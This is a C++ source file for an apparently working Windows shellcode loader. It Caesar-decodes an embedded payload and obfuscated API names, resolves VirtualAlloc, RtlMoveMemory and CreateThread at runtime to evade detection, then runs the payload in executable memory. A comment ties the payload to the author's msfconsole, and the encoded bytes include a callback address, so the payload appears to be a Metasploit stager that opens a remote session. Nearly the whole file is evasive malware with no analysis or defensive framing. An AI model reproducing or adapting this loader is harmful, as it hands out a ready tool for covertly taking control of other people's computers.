#include <iostream>
#include <Windows.h>

typedef LPVOID(WINAPI* VA)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect
    );

typedef VOID(WINAPI* MVM)(
    VOID UNALIGNED* Destination,
    const VOID UNALIGNED* Source,
    SIZE_T Length
    );

typedef HANDLE(WINAPI* CT)(
    LPSECURITY_ATTRIBUTES lpThreadAttribute,
    SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    __drv_aliasesMem LPVOID lpParameter,
    DWORD dwCreationFlag,
    LPDWORD lpThreadID
    );


void decodeCaesar(unsigned char buf[], int size, int caesarOffset)
{
    printf("Decoded: \n");
    //decode fucntion
    for (int i = 0; i < size - 1; i++)
    {
        buf[i] = (char((int)buf[i] - caesarOffset % 255));
        printf("%c", buf[i]);
    }
    printf("\n");
}

int main()
{
    void* execute;
    HANDLE thread;

    // ++++++++
    // WARNING
    // for some reason if i try to connect to my msfconsole more than once it will cause my program to throw the 0x96 Invalid Instruction error
    // ++++++++
    
    /*
    // offset = 1
    unsigned char vaBuf[] = "\x57\x6a\x73\x75\x76\x62\x6d\x42\x6d\x6d\x70\x64";
    unsigned char shellBuf[] = "\xfd\x49\x84\xe5\xf1\xe9\xcd\x01\x01\x01\x42\x52\x42\x51\x53\x52\x49\x32\xd3\x57\x66\x49\x8c\x53\x61\x49\x8c\x53\x19\x49\x8c\x53\x21\x49\x10\xb8\x4b\x4b\x49\x8c\x73\x51\x4e\x32\xca\x49\x32\xc1\xad\x3d\x62\x7d\x03\x2d\x21\x42\xc2\xca\x0e\x42\x02\xc2\xe3\xee\x53\x49\x8c\x53\x21\x8c\x43\x3d\x49\x02\xd1\x42\x52\x67\x82\x79\x19\x0c\x03\x10\x86\x73\x01\x01\x01\x8c\x81\x89\x01\x01\x01\x49\x86\xc1\x75\x68\x49\x02\xd1\x51\x8c\x49\x19\x45\x8c\x41\x21\x4a\x02\xd1\xe4\x57\x4e\x32\xca\x49\x00\xca\x42\x8c\x35\x89\x49\x02\xd7\x49\x32\xc1\xad\x42\xc2\xca\x0e\x42\x02\xc2\x39\xe1\x76\xf2\x4d\x04\x4d\x25\x09\x46\x3a\xd2\x76\xd9\x59\x45\x8c\x41\x25\x4a\x02\xd1\x67\x42\x8c\x0d\x49\x45\x8c\x41\x1d\x4a\x02\xd1\x42\x8c\x05\x89\x49\x02\xd1\x42\x59\x42\x59\x5f\x5a\x5b\x42\x59\x42\x5a\x42\x5b\x49\x84\xed\x21\x42\x53\x00\xe1\x59\x42\x5a\x5b\x49\x8c\x13\xea\x4c\x00\x00\x00\x5e\x49\x32\xdc\x54\x4a\xbf\x78\x6a\x6f\x6a\x6f\x66\x75\x01\x42\x57\x49\x8a\xe2\x4a\xc8\xc3\x4d\x78\x27\x08\x00\xd6\x54\x54\x49\x8a\xe2\x54\x5b\x4e\x32\xc1\x4e\x32\xca\x54\x54\x4a\xbb\x3b\x57\x7a\xa8\x01\x01\x01\x01\x00\xd6\xe9\x11\x01\x01\x01\x32\x3a\x33\x2f\x32\x37\x39\x2f\x33\x34\x36\x2f\x32\x33\x39\x01\x5b\x49\x8a\xc2\x4a\xc8\xc1\x10\x28\x01\x01\x4e\x32\xca\x54\x54\x6b\x04\x54\x4a\xbb\x58\x8a\xa0\xc7\x01\x01\x01\x01\x00\xd6\xe9\xe6\x01\x01\x01\x30\x70\x53\x71\x6c\x3a\x78\x57\x7a\x4d\x72\x79\x33\x4a\x6f\x64\x68\x46\x6a\x4e\x33\x6d\x78\x77\x37\x57\x4e\x76\x77\x6b\x4c\x47\x56\x4f\x35\x63\x4b\x60\x63\x76\x60\x6c\x38\x39\x73\x44\x32\x56\x63\x6c\x6c\x33\x6a\x68\x52\x4d\x6b\x47\x33\x69\x51\x56\x67\x34\x6d\x2e\x35\x38\x71\x6c\x71\x5b\x6d\x72\x3a\x45\x77\x5a\x49\x35\x53\x74\x5b\x35\x46\x35\x42\x4c\x62\x48\x32\x74\x48\x64\x2e\x76\x6a\x77\x69\x4b\x39\x50\x39\x4e\x50\x4d\x42\x57\x55\x79\x6c\x35\x48\x55\x48\x4c\x55\x57\x54\x31\x68\x64\x52\x32\x73\x72\x48\x6c\x79\x39\x58\x63\x44\x6d\x78\x77\x42\x39\x32\x64\x7a\x72\x67\x6b\x70\x50\x78\x75\x6b\x56\x64\x55\x60\x52\x5a\x4f\x78\x77\x57\x2e\x66\x4f\x73\x38\x4b\x72\x4c\x4d\x65\x52\x54\x67\x7b\x78\x58\x76\x65\x67\x3a\x5a\x48\x3a\x3a\x54\x38\x58\x36\x58\x76\x65\x60\x64\x50\x31\x4f\x44\x4b\x52\x60\x39\x51\x63\x68\x6b\x33\x78\x6e\x4b\x56\x4b\x78\x4e\x33\x6b\x52\x68\x59\x54\x6d\x69\x70\x7a\x47\x4a\x60\x48\x4b\x6c\x01\x49\x8a\xc2\x54\x5b\x42\x59\x4e\x32\xca\x54\x49\xb9\x01\x33\xa9\x85\x01\x01\x01\x01\x51\x54\x54\x4a\xc8\xc3\xec\x56\x2f\x3c\x00\xd6\x49\x8a\xc7\x6b\x0b\x60\x49\x8a\xf2\x6b\x20\x5b\x53\x69\x81\x34\x01\x01\x4a\x8a\xe1\x6b\x05\x42\x5a\x4a\xbb\x76\x47\x9f\x87\x01\x01\x01\x01\x00\xd6\x4e\x32\xc1\x54\x5b\x49\x8a\xf2\x4e\x32\xca\x4e\x32\xca\x54\x54\x4a\xc8\xc3\x2e\x07\x19\x7c\x00\xd6\x86\xc1\x76\x20\x49\xc8\xc2\x89\x14\x01\x01\x4a\xbb\x45\xf1\x36\xe1\x01\x01\x01\x01\x00\xd6\x49\x00\xd0\x75\x03\xec\xab\xe9\x56\x01\x01\x01\x54\x5a\x6b\x41\x5b\x4a\x8a\xd2\xc2\xe3\x11\x4a\xc8\xc1\x01\x11\x01\x01\x4a\xbb\x59\xa5\x54\xe6\x01\x01\x01\x01\x00\xd6\x49\x94\x54\x54\x49\x8a\xe8\x49\x8a\xf2\x49\x8a\xdb\x4a\xc8\xc1\x01\x21\x01\x01\x4a\x8a\xfa\x4a\xbb\x13\x97\x8a\xe3\x01\x01\x01\x01\x00\xd6\x49\x84\xc5\x21\x86\xc1\x75\xb3\x67\x8c\x08\x49\x02\xc4\x86\xc1\x76\xd3\x59\xc4\x59\x6b\x01\x5a\x4a\xc8\xc3\xf1\xb6\xa3\x57\x00\xd6";
    unsigned char kernBuf[] = "\x6c\x66\x73\x6f\x66\x6d\x34\x33";
    unsigned char mvmBuf[] = "\x53\x75\x6d\x4e\x70\x77\x66\x4e\x66\x6e\x70\x73\x7a";
    unsigned char ctBuf[] = "\x44\x73\x66\x62\x75\x66\x55\x69\x73\x66\x62\x65";
    */

    //buffers   
    // offset = 197
    unsigned char vaBuf[] = "\x1b\x2e\x37\x39\x3a\x26\x31\x06\x31\x31\x34\x28";
    unsigned char shellBuf[] = "\xc1\x0d\x48\xa9\xb5\xad\x91\xc5\xc5\xc5\x06\x16\x06\x15\x17\x16\x0d\xf6\x97\x1b\x2a\x0d\x50\x17\x25\x0d\x50\x17\xdd\x0d\x50\x17\xe5\x0d\xd4\x7c\x0f\x0f\x0d\x50\x37\x15\x12\xf6\x8e\x0d\xf6\x85\x71\x01\x26\x41\xc7\xf1\xe5\x06\x86\x8e\xd2\x06\xc6\x86\xa7\xb2\x17\x0d\x50\x17\xe5\x50\x07\x01\x0d\xc6\x95\x06\x16\x2b\x46\x3d\xdd\xd0\xc7\xd4\x4a\x37\xc5\xc5\xc5\x50\x45\x4d\xc5\xc5\xc5\x0d\x4a\x85\x39\x2c\x0d\xc6\x95\x15\x50\x0d\xdd\x09\x50\x05\xe5\x0e\xc6\x95\xa8\x1b\x12\xf6\x8e\x0d\xc4\x8e\x06\x50\xf9\x4d\x0d\xc6\x9b\x0d\xf6\x85\x71\x06\x86\x8e\xd2\x06\xc6\x86\xfd\xa5\x3a\xb6\x11\xc8\x11\xe9\xcd\x0a\xfe\x96\x3a\x9d\x1d\x09\x50\x05\xe9\x0e\xc6\x95\x2b\x06\x50\xd1\x0d\x09\x50\x05\xe1\x0e\xc6\x95\x06\x50\xc9\x4d\x0d\xc6\x95\x06\x1d\x06\x1d\x23\x1e\x1f\x06\x1d\x06\x1e\x06\x1f\x0d\x48\xb1\xe5\x06\x17\xc4\xa5\x1d\x06\x1e\x1f\x0d\x50\xd7\xae\x10\xc4\xc4\xc4\x22\x0d\xf6\xa0\x18\x0e\x83\x3c\x2e\x33\x2e\x33\x2a\x39\xc5\x06\x1b\x0d\x4e\xa6\x0e\x8c\x87\x11\x3c\xeb\xcc\xc4\x9a\x18\x18\x0d\x4e\xa6\x18\x1f\x12\xf6\x85\x12\xf6\x8e\x18\x18\x0e\x7f\xff\x1b\x3e\x6c\xc5\xc5\xc5\xc5\xc4\x9a\xad\xd5\xc5\xc5\xc5\xf6\xfe\xf7\xf3\xf6\xfb\xfd\xf3\xf7\xf8\xfa\xf3\xf6\xf7\xfd\xc5\x1f\x0d\x4e\x86\x0e\x8c\x85\xd4\xec\xc5\xc5\x12\xf6\x8e\x18\x18\x2f\xc8\x18\x0e\x7f\x1c\x4e\x64\x8b\xc5\xc5\xc5\xc5\xc4\x9a\xad\xaa\xc5\xc5\xc5\xf4\x34\x17\x35\x30\xfe\x3c\x1b\x3e\x11\x36\x3d\xf7\x0e\x33\x28\x2c\x0a\x2e\x12\xf7\x31\x3c\x3b\xfb\x1b\x12\x3a\x3b\x2f\x10\x0b\x1a\x13\xf9\x27\x0f\x24\x27\x3a\x24\x30\xfc\xfd\x37\x08\xf6\x1a\x27\x30\x30\xf7\x2e\x2c\x16\x11\x2f\x0b\xf7\x2d\x15\x1a\x2b\xf8\x31\xf2\xf9\xfc\x35\x30\x35\x1f\x31\x36\xfe\x09\x3b\x1e\x0d\xf9\x17\x38\x1f\xf9\x0a\xf9\x06\x10\x26\x0c\xf6\x38\x0c\x28\xf2\x3a\x2e\x3b\x2d\x0f\xfd\x14\xfd\x12\x14\x11\x06\x1b\x19\x3d\x30\xf9\x0c\x19\x0c\x10\x19\x1b\x18\xf5\x2c\x28\x16\xf6\x37\x36\x0c\x30\x3d\xfd\x1c\x27\x08\x31\x3c\x3b\x06\xfd\xf6\x28\x3e\x36\x2b\x2f\x34\x14\x3c\x39\x2f\x1a\x28\x19\x24\x16\x1e\x13\x3c\x3b\x1b\xf2\x2a\x13\x37\xfc\x0f\x36\x10\x11\x29\x16\x18\x2b\x3f\x3c\x1c\x3a\x29\x2b\xfe\x1e\x0c\xfe\xfe\x18\xfc\x1c\xfa\x1c\x3a\x29\x24\x28\x14\xf5\x13\x08\x0f\x16\x24\xfd\x15\x27\x2c\x2f\xf7\x3c\x32\x0f\x1a\x0f\x3c\x12\xf7\x2f\x16\x2c\x1d\x18\x31\x2d\x34\x3e\x0b\x0e\x24\x0c\x0f\x30\xc5\x0d\x4e\x86\x18\x1f\x06\x1d\x12\xf6\x8e\x18\x0d\x7d\xc5\xf7\x6d\x49\xc5\xc5\xc5\xc5\x15\x18\x18\x0e\x8c\x87\xb0\x1a\xf3\x00\xc4\x9a\x0d\x4e\x8b\x2f\xcf\x24\x0d\x4e\xb6\x2f\xe4\x1f\x17\x2d\x45\xf8\xc5\xc5\x0e\x4e\xa5\x2f\xc9\x06\x1e\x0e\x7f\x3a\x0b\x63\x4b\xc5\xc5\xc5\xc5\xc4\x9a\x12\xf6\x85\x18\x1f\x0d\x4e\xb6\x12\xf6\x8e\x12\xf6\x8e\x18\x18\x0e\x8c\x87\xf2\xcb\xdd\x40\xc4\x9a\x4a\x85\x3a\xe4\x0d\x8c\x86\x4d\xd8\xc5\xc5\x0e\x7f\x09\xb5\xfa\xa5\xc5\xc5\xc5\xc5\xc4\x9a\x0d\xc4\x94\x39\xc7\xb0\x6f\xad\x1a\xc5\xc5\xc5\x18\x1e\x2f\x05\x1f\x0e\x4e\x96\x86\xa7\xd5\x0e\x8c\x85\xc5\xd5\xc5\xc5\x0e\x7f\x1d\x69\x18\xaa\xc5\xc5\xc5\xc5\xc4\x9a\x0d\x58\x18\x18\x0d\x4e\xac\x0d\x4e\xb6\x0d\x4e\x9f\x0e\x8c\x85\xc5\xe5\xc5\xc5\x0e\x4e\xbe\x0e\x7f\xd7\x5b\x4e\xa7\xc5\xc5\xc5\xc5\xc4\x9a\x0d\x48\x89\xe5\x4a\x85\x39\x77\x2b\x50\xcc\x0d\xc6\x88\x4a\x85\x3a\x97\x1d\x88\x1d\x2f\xc5\x1e\x0e\x8c\x87\xb5\x7a\x67\x1b\xc4\x9a";
    unsigned char mvmBuf[] = "\x17\x39\x31\x12\x34\x3b\x2a\x12\x2a\x32\x34\x37\x3e";
    unsigned char ctBuf[] = "\x08\x37\x2a\x26\x39\x2a\x19\x2d\x37\x2a\x26\x29";
    unsigned char kernBuf[] = "\x30\x2a\x37\x33\x2a\x31\xf8\xf7";
    
    //buffer lens
    unsigned int vaBufLegth, shellBufLength, kernBufLength, mvmBufLength, ctBufLength;
    vaBufLegth = sizeof(vaBuf);
    shellBufLength = sizeof(shellBuf);
    kernBufLength = sizeof(kernBuf);
    mvmBufLength = sizeof(mvmBuf);
    ctBufLength = sizeof(ctBuf);

    //decode bufs
    int caesarOffset = 197;
    decodeCaesar(vaBuf, vaBufLegth, caesarOffset);
    decodeCaesar(shellBuf, shellBufLength, caesarOffset);
    decodeCaesar(kernBuf, kernBufLength, caesarOffset);
    decodeCaesar(mvmBuf, mvmBufLength, caesarOffset);
    decodeCaesar(ctBuf, ctBufLength, caesarOffset);

    //VirtualAlloc
    //execute = VirtualAlloc(0, shellBufLength, MEM_COMMIT | MEM_RESERVE, 0x40);
    VA vaAddy = (VA)GetProcAddress(GetModuleHandleA((LPCSTR)kernBuf), (LPCSTR)vaBuf);
    execute = vaAddy(0, shellBufLength, MEM_COMMIT | MEM_RESERVE, 0x40);
    if (execute == 0)
    {
        printf("Allocate error!\n");
        return 0;
    }

    //RtlMoveMemory
    //memcpy(execute, shellBuf, shellBufLength);
    MVM mvmAddy = (MVM)GetProcAddress(GetModuleHandleA((LPCSTR)kernBuf), (LPCSTR)mvmBuf);
    mvmAddy((LPVOID*)execute, (LPVOID*)shellBuf, shellBufLength);

    //CreateThread
    //thread = CreateThread(0, shellBufLength, (LPTHREAD_START_ROUTINE)execute, 0, 0, 0);
    CT ctAddy = (CT)GetProcAddress(GetModuleHandleA((LPCSTR)kernBuf), (LPCSTR)ctBuf);
    thread = ctAddy(0, 0, (LPTHREAD_START_ROUTINE)execute, 0, 0, 0);
    if (thread == 0)
    {
        printf("Thread error!\n");
        printf("Error Info: %c", GetLastError());
        return -69;
    }

    //SetThreadPriority(thread, 2);
    //printf("Thread Priority: %d\n", GetThreadPriority(thread));

    WaitForSingleObject(thread, -1);

    return 0;
}